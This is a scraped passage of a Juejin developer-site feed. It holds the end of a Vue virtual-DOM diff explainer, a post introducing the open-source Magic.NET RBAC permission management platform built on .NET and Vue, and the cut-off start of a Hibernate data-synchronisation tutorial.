<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d18c036d24b84dd281f2b17407430125~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730552&amp;x-signature=sKW3IPwYH8T3O%2BZqBXSMwY74YAI%3D" alt="image.png" loading="lazy"/></p>
<p>四次循环中，发现了新头旧头相同，于是 diff 后创建了 A 的真实节点，插入到前一次创建的 E 节点后面。同时旧节点的 <code>startIndex</code> 移动到了 B，<code>新节点的startIndex</code> 移动到了 B</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51c36115bc9c435e8b2698b46d68b7eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730552&amp;x-signature=VZKbtZB%2BSktwdgKS%2B0ACZ63%2B700%3D" alt="image.png" loading="lazy"/></p>
<p>第五次循环中，发现了新头旧头相同，因此 diff 后创建了 B 真实节点 插入到前一次创建的 A 节点后面。同时旧节点的 <code>startIndex</code>移动到了 C，新节点的<code>startIndex</code>移动到了 F。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/662bbc50b30047deb95e168722d32442~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730552&amp;x-signature=ESZQ3wJH4F1QV1N2JOZbWRoFg2Y%3D" alt="image.png" loading="lazy"/></p>
<p>最后一次循环中，发现在旧节点中没有找到F节点，这时直接创建 F 对应的真实节点，直接将其插入到 B 节点后面，并将新头指针向后移动一位，发现startIndex大于endIndex ，这时循环结束。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87fd8bbdeb9c42af89fcd05f1e28b5c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730552&amp;x-signature=LTtsxKfLVaERF4%2FHU95Fy6mqghM%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-7">四、 总结</h2>
<ul>
<li><strong>Diff 的本质</strong>：是虚拟 DOM 周期的终点，也是真实 DOM 更新的起点。</li>
<li><strong>Key 的重要性</strong>：没有 <code>key</code> 会导致 Diff 算法回退到性能极差的逐个更新模式。务必在 <code>v-for</code> 中提供稳定、唯一的 <code>key</code>。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一个基于 .NET + Vue 实现的通用权限管理平台（RBAC模式），前后端分离模式，开箱即用！]]></title>    <link>https://juejin.cn/post/7602420156397568043</link>    <guid>https://juejin.cn/post/7602420156397568043</guid>    <pubDate>2026-02-03T13:44:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397568043" data-draft-id="7602503154505269289" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一个基于 .NET + Vue 实现的通用权限管理平台（RBAC模式），前后端分离模式，开箱即用！"/> <meta itemprop="keywords" content="后端,.NET"/> <meta itemprop="datePublished" content="2026-02-03T13:44:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="追逐时光者"/> <meta itemprop="url" content="https://juejin.cn/user/2770425031690333"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一个基于 .NET + Vue 实现的通用权限管理平台（RBAC模式），前后端分离模式，开箱即用！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2770425031690333/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    追逐时光者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:44:38.000Z" title="Tue Feb 03 2026 13:44:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>今天大姚给大家分享一个基于 .NET + Vue 实现的通用权限管理平台（RBAC模式），前后端分离模式，开箱即用：<strong>Magic.NET</strong>。</p>
<h2 data-id="heading-1">项目介绍</h2>
<p>Magic.NET 是一个基于 .NET 6、7 实现的通用权限管理平台（RBAC模式），基于 Apache-2.0 协议开源。整合最新技术高效快速开发，前后端分离模式，开箱即用，模块化架构设计，层次清晰。前端基于小诺Vue（antd）框架，整体 RBAC 基础数据结构+API接口风格采用小诺vue版本模式。</p>
<h2 data-id="heading-2">应用场景</h2>
<p>Magic.NET 适用于需要精细权限管理的企业管理应用系统（如 ERP、CRM、OA 等）。</p>
<h2 data-id="heading-3">功能模块</h2>
<ul>
<li>
<p><strong>用户管理</strong>：对企业用户和系统管理员用户的维护，可绑定用户职务、机构、角色、数据权限等。</p>
</li>
<li>
<p><strong>角色管理</strong>：角色绑定菜单后，可限制相关角色的人员登录系统的功能范围。角色也可以绑定数据授权范围。</p>
</li>
<li>
<p><strong>职位管理</strong>：用户职务管理，职务可作为用户的一个标签，职务目前没有和权限等其他功能挂钩。</p>
</li>
<li>
<p><strong>组织机构管理</strong>：公司组织架构维护，支持多层级结构的树形结构。</p>
</li>
<li>
<p><strong>菜单管理</strong>：菜单目录、菜单和按钮的维护是权限控制的基本单位。</p>
</li>
<li>
<p><strong>字典管理</strong>：系统内各种枚举类型的维护。</p>
</li>
<li>
<p><strong>日志管理</strong>：</p>
<ul>
<li><strong>访问日志</strong>：用户的登录和退出日志的查看和管理。</li>
<li><strong>操作日志</strong>：用户的操作业务的日志的查看和管理。</li>
</ul>
</li>
<li>
<p><strong>多应用管理</strong>：通过应用来控制不同维度的菜单展示。</p>
</li>
<li>
<p><strong>文件管理</strong>：文件的上传、下载、查看等操作，文件可使用本地存储、阿里云 OSS、腾讯 COS 接入，支持拓展。</p>
</li>
<li>
<p><strong>定时任务</strong>：定时任务的维护，通过 cron 表达式控制任务的执行频率。</p>
</li>
<li>
<p><strong>系统配置</strong>：系统运行的参数的维护，参数的配置与系统运行机制息息相关。</p>
</li>
<li>
<p><strong>服务监控</strong>：服务器的运行状态，CPU、内存、网络等信息数据的查看。</p>
</li>
<li>
<p>等等等...</p>
</li>
</ul>
<h2 data-id="heading-4">功能特点</h2>
<ul>
<li><strong>前后端分离</strong>：前端基于 Vue 框架，后端基于 .NET 6/7，实现前后端解耦。</li>
<li><strong>模块化架构设计</strong>：层次清晰，业务层推荐写到单独模块，框架升级不影响业务。</li>
<li><strong>RBAC 权限模型</strong>：基于角色的访问控制，实现精细化的权限管理。</li>
<li><strong>易扩展</strong>：代码量少、通俗易懂、功能强大，易于扩展和维护。</li>
<li>等等等...</li>
</ul>
<h2 data-id="heading-5">项目技术栈</h2>
<ul>
<li><strong>后端技术栈：</strong> .NET、Furion、MiniExcel、SqlSugar等。</li>
<li><strong>前端技术栈：</strong> Vue、Ant Design of Vue等。</li>
<li><strong>数据库支持：</strong> SQLite、SQL Server、MySQL。</li>
</ul>
<h2 data-id="heading-6">项目源代码</h2>
<h3 data-id="heading-7">后端代码</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/337eedd3b98b4639afcaa0c9b56bd9e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=b7q4sP6ePYxy%2BC7HPhirGNOlzU0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb2a9e747a5148528bf5d56f43bd2b50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=SDFLc7fbD%2FQJ88yQsXbIXv2WzZo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">前端代码</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40d4e77896474be1bdf901dd6dfcb994~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=g1iFS4WLuLZolzolcBel67O3zf0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">项目演示</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17bcae953bb0477cbb4e6260af3edb50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=%2F7nxsvuHLFjrn94PxidQ%2FuOZ%2FuY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cce8faf2b89747e7a62a3e2c174d63d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=jR%2BViPVRCjhYkruvO%2BbA7P7uBbk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c1c8d5156834ae7b3f0fc8f74521a0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=L04s1vGlYjbgrqM1fmidZU9e2qY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f94bfb9b6b34d57986440ee9aa7917c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=Q2Y5S65dBqtQDvV7cInEckdtUIM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b6c268f5c68435a9cc37b7c20589eca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=9WUS0BH1HUe8yRZ1wvcauwsduBk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce0584b04f8848ecbbc285132809d387~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=7H7OedLYPzUV8Jz8In%2BzUTituxg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/472d1bec9e374d2fb7a26fc6e6a41d6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=VwKxbtvp%2BAH%2BNSRaOlU8b5PnJA0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8ab02f57ddb4672856325eb5331aa3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=UcSLicZQA7lQ%2BonaGJ16Bbx2RYw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9266cf395c7a4d3f8a2a2e30e66590ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=7293C5O75HvN3QXCrNHft0Pa458%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa5db3a356c84a5a848af2f8c3a456d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=wF3nVWbyUdReosIWb3RjLp0gd%2Bo%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d21e27a1211e4032b8f9fe2760fe6d23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=vdeCgwj1gPEdVvUX5Tu6C64TBZI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1248cf9ad4c4aedb65ac33677891eb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731078&amp;x-signature=5fP1iXTgwwTENc9FBZ2ZqQbM7uU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">项目源码地址</h2>
<p>更多项目实用功能和特性欢迎前往项目开源地址查看👀，别忘了给项目一个Star支持💖。</p>
<ul>
<li><strong>Gitee开源地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fzhengguojing%2Fmagic-net" target="_blank" title="https://gitee.com/zhengguojing/magic-net" ref="nofollow noopener noreferrer">gitee.com/zhengguojin…</a></li>
</ul>
<h2 data-id="heading-11">优秀项目和框架精选</h2>
<p>该项目已收录到C#/.NET/.NET Core优秀项目和框架精选中，关注优秀项目和框架精选能让你及时了解C#、.NET和.NET Core领域的最新动态和最佳实践，提高开发工作效率和质量。坑已挖，欢迎大家踊跃提交PR推荐或自荐（<strong>让优秀的项目和框架不被埋没🤞</strong>）。</p>
<ul>
<li><strong>GitHub开源地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYSGStudyHards%2FDotNetGuide%2Fblob%2Fmain%2Fdocs%2FDotNet%2FDotNetProjectPicks.md" target="_blank" title="https://github.com/YSGStudyHards/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md" ref="nofollow noopener noreferrer">github.com/YSGStudyHar…</a></li>
<li><strong>Gitee开源地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fysgdaydayup%2FDotNetGuide%2Fblob%2Fmain%2Fdocs%2FDotNet%2FDotNetProjectPicks.md" target="_blank" title="https://gitee.com/ysgdaydayup/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md" ref="nofollow noopener noreferrer">gitee.com/ysgdaydayup…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（81）如何在数据同步中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7602503154505039913</link>    <guid>https://juejin.cn/post/7602503154505039913</guid>    <pubDate>2026-02-03T12:11:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154505039913" data-draft-id="7602455806446075910" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（81）如何在数据同步中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T12:11:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（81）如何在数据同步中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:11:56.000Z" title="Tue Feb 03 2026 12:11:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在数据同步过程中使用Hibernate，可以帮助你从一个数据库中提取数据，并将这些数据同步到另一个数据库中。以下是一个详细的示例，结合代码演示如何在数据同步过程中使用Hibernate。</p>
<h3 data-id="heading-0">1. 设置Hibernate配置</h3>
